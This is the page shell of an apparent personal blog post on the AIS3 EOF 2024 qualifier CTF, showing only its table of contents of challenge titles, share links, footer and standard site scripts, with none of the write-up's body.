        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AIS3-EOF-QUAL-2024-Write-Up"><span class="toc-number">1.</span> <span class="toc-text">AIS3 EOF QUAL 2024 Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">1.2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">1.2.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Welcome"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Welcome</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.2.2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-AES"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">Baby AES</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-ECDLP"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">Baby ECDLP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-RSA"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">Baby RSA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.2.3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Lookup-Tool-Final"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">DNS Lookup Tool: Final</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Internal"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">Internal</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">1.3.</span> <span class="toc-text">After all</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/01/10/EOFQUAL2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&text=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&is_video=false&description=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 EOF QUAL 2024 Write Up&body=Check out this article: http://wha13.github.io/2024/01/10/EOFQUAL2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&title=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/01/10/EOFQUAL2023/&name=AIS3 EOF QUAL 2024 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/01/10/EOFQUAL2023/&t=AIS3 EOF QUAL 2024 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
